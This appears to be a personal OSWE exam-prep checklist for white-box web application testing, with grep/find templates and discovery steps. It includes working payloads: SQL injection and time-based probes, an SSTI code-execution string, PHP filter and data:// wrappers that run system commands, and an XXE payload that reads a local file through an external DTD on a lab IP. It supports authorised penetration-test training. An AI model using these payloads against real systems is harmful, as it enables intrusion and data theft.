- Templates 
  - Find
    - `find . -type f -regex ".*/.*abc.*"`
    - `find . -type f -iname "*abc*"`
    - `find . -type f -regex ".*/.*abc.*" -exec echo 'I found a file named {}' ';'`
  - Grep
    - `grep -nrP --color=always`
    - `grep -nrP -A 1 -B 3 --color=always`
    - `grep -nrP --include *.html`
    - `grep -nrP --include=\*.{cpp,h}`
    - -E, --extended-regexp Interpret PATTERN as an extended regular expression (ERE, see below). (-E is specified by POSIX .) 
    - -F, --fixed-strings Interpret PATTERN as a list of fixed strings, separated by newlines, any of which is to be matched. (-F is specified by POSIX .) 
    - -G, --basic-regexp Interpret PATTERN as a basic regular expression (BRE, see below). This is the default. 
    - -P, --perl-regexp Interpret PATTERN as a Perl regular expression. This is highly experimental and grep -P may warn of unimplemented features. 
    - -i, --ignore-case 
    - -v, --invert-match 
    - -n, --line-number 
    - --include=GLOB Search only files whose base name matches GLOB can use *, ?, and [...] as wildcards
    - --exclude=GLOB Skip files whose base name matches GLOB 
    - -w, --word-regexp matching substring must either be at the beginning of the line, or preceded by a  non-word constituent character

- Initial discovery
  - [ ] Basic port scan
  - [ ] Default user accounts 
  - [ ] Check cookies and response headers
  - [ ] Check how each user controlled input reflect in the UI (XSS/SSTI)
  - [ ] Loose comparison in PHP (+ magic hashes)
  - [ ] Find deployment location using "ps -ef" or "Process Explorer" 
  - [ ] `grep -rnw "eval(" . --color`
  - [ ] query `^.*?query.*?select.*?`
  - [ ] Routing configuration
  - [ ] whitelist/blacklists
  - [ ] "Random" usage or MD5 SHA1 usage
  - [ ] Source of 404 and other error pages
  - [ ] README.md / CHANGELOG.md
    - [ ] `while read l; do echo "===$l==="; curl $l/README.md -k; done < packages.txt`
    - [ ] `cat commands.html | grep -E "script.*src" | grep -Ev "vendor|lib|plugin"`
    - [ ] `wget --no-check-certificate -q -i list.txt`
    - [ ] `for f in compressed_*.js; do js-beautify $f > pretty/"${f//compressed_}"; done;`
  - Identify libraries
    - [ ] `wget https://github.com/nice-registry/all-the-package-names/raw/master/names.json`
    - [ ] `jq '.[0:10000]' names.json | grep ","| cut -d'"' -f 2 > npm-10000.txt`
    - [ ] `gobuster dir -w ./npm-10000.txt -u https://openitcockpit/js/vendor/ -k`
  - Files
    - `find ./ -iname "*.html"`
    - `grep -r "document.write" ./ --include *.html`
  - Identify WSS endpoint and client code that interact with it 
  - Identify serialized values 
  - Check network interfaces
  - /var/log/auth.log
  - `wget https://github.com/nice-registry/all-the-package-names/raw/master/names.json`
    - `jq '.[0:10000]' names.json | grep ","| cut -d'"' -f 2 > npm-10000.txt`
    - `gobuster dir -w ./npm-10000.txt -u https://openitcockpit/js/vendor/ -k`


- Enabling Logging 
  - [ ] Enable database query logs
  - [ ] PHP display_errors = ON
  - [ ] Log4j configurations
  - [ ] PHP - var_dump
  - [ ] Get error info
    - [ ] Using param[] instead of param to get error messages
    - [ ] Send invalid JSON/XML inputs
  - [ ] Writable files: `find /var/www/html/ -type d -perm -o+w`
  - [ ] Python debugging using - PTVSD 

- Authentication related interesting functions
  - [ ] Session cookie has `httpOnly` flag set (stealing cookie over XSS)
  - [ ] Username enumeration
  - [ ] Login
  - [ ] Registration
  - [ ] Change password
  - [ ] Change email
  - [ ] Confirmation of email update
  - [ ] High authorization functions

- SQLi
  - [ ] Check binary: OR (select 1)=1 --
  - [ ] Check binary with brackets: OR (select 1)=1) --
  - [ ] USERID=1;SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)-- 
  - [ ] USERID=1; select+pg_sleep(10);--
  - [ ] USERID=1 UNION SELECT CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END--
  - [ ] Escaping
    - [ ] Spaces with: /**/
    - [ ] Quotes with: Hex notation or $$example$$
    - [ ] select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');
    - [ ] SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
  - [ ] Write file
    - [ ] COPY TO/COPY FROM
    - [ ] LO_IMPORT/LO_EXPORT
  - [ ] RCE
    - [ ] PG extension (DLL)
    - [ ] Java PROCEDURE - HSQLDB
      - [ ] com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename
      - [ ] java.lang.System.getProperty

- CSRF
  - [ ] Is CSRF protection present. 
  - [ ] Can XSS be used to initiate a cross origin request. 

- Interesting function
  - [ ] File upload
    - [ ] Can the base path be altered
    - [ ] ZIP slip
    - [ ] Validation bypass
      - [ ] <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files>
      - [ ] <https://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html>
      - [ ] <https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload>
  - [ ] File download
    - [ ] Can the base path be altered
  - [ ] Setup operations and database scripts
  - [ ] Configuration structure
  - [ ] Search functions 
  - [ ] APIs
  - [ ] XML/JSON processing functions
  - [ ] Mass assignment
    - [ ] <https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Mass_Assignment_Cheat_Sheet.md>

- SSTI
  - [ ] Check expressions like ({10*10)}
  - [ ] Inject logs `;require('util').log('CODE_EXECUTION');`
  - [ ] <https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf>

- Payloads 
  - [ ] FuzzDB <https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/os-cmd-execution/command-injection-template.txt>
  - LFI
    - [ ] `/proc/self/cmdline`
  - [] `{var} ${var} {{var}} <%var%> [% var %]`

- Exam tips
  - [ ] Search technology inside OSWE notes
  - [ ] Search technology in Payload All The Things repo 
  - [ ] .dockerenv / env / cron
  - [ ] `php://filter/read=convert.base64-encode/resource=example.php`
  - [ ] `data://text/plain,<?php echo system(“uname -a”);?>`
  - [ ] graphql
  - [ ] .Net fiddle
  - [ ] <https://github.com/blabla1337/skf-labs>
  - [ ] <https://www.tunnelsup.com/hash-analyzer/>
  - [ ] 


- Steps
  - What are the exposed functions to non-auth users
  - How admin panel / user panel check if user is logged in
  - Login/registration/forgot-password/logout functions
  
XXE
```xml
<!ENTITY wrapper "%start;%file;%end;">

<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///home/student/crx/data/hsqldb/dbmanager.sh" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.119.120/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
<lastName>&wrapper;</lastName>
<firstName>Tom</firstName> </org.opencrx.kernel.account1.Contact>
```
